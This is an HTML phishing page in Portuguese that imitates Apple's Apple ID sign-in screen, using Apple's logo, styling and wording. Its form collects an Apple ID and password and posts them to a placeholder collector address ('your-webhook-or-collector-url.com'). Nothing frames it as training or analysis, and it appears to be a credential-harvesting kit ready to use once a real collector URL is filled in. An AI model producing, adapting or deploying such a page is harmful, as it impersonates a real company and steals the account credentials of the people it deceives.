<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Entrar no Apple ID</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", "Roboto", "Oxygen", "Ubuntu", "Cantarell", "Fira Sans", "Droid Sans", "Helvetica Neue", sans-serif;
            background-color: #f4f4f7;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .container {
            background-color: white;
            padding: 20px;
            border-radius: 15px;
            box-shadow: 0 2px 20px rgba(0, 0, 0, 0.1);
            width: 300px;
            text-align: center;
        }
        h2 {
            color: #333;
            font-size: 24px;
            margin-bottom: 20px;
        }
        .apple-logo {
            width: 100px;
            margin-bottom: 30px;
        }
        .input-field {
            width: 100%;
            padding: 12px 15px;
            margin: 10px 0;
            border: 1px solid #ccc;
            border-radius: 10px;
            font-size: 16px;
        }
        .input-field:focus {
            border-color: #0071e3;
            outline: none;
        }
        .submit-btn {
            width: 100%;
            padding: 12px 0;
            background-color: #0071e3;
            color: white;
            font-size: 18px;
            border: none;
            border-radius: 10px;
            cursor: pointer;
        }
        .submit-btn:hover {
            background-color: #005bb5;
        }
        .forgot-password {
            font-size: 14px;
            color: #0071e3;
            text-decoration: none;
        }
        .forgot-password:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>
    <div class="container">
        <img src="https://upload.wikimedia.org/wikipedia/commons/a/a1/Apple_logo.svg" alt="Apple Logo" class="apple-logo">
        <h2>Entrar no Apple ID</h2>
        <form action="https://your-webhook-or-collector-url.com" method="POST">
            <input type="text" name="username" class="input-field" placeholder="Apple ID" required>
            <input type="password" name="password" class="input-field" placeholder="Senha" required>
            <button type="submit" class="submit-btn">Entrar</button>
        </form>
        <a href="#" class="forgot-password">Esqueceu o Apple ID ou a senha?</a>
    </div>
</body>
</html>
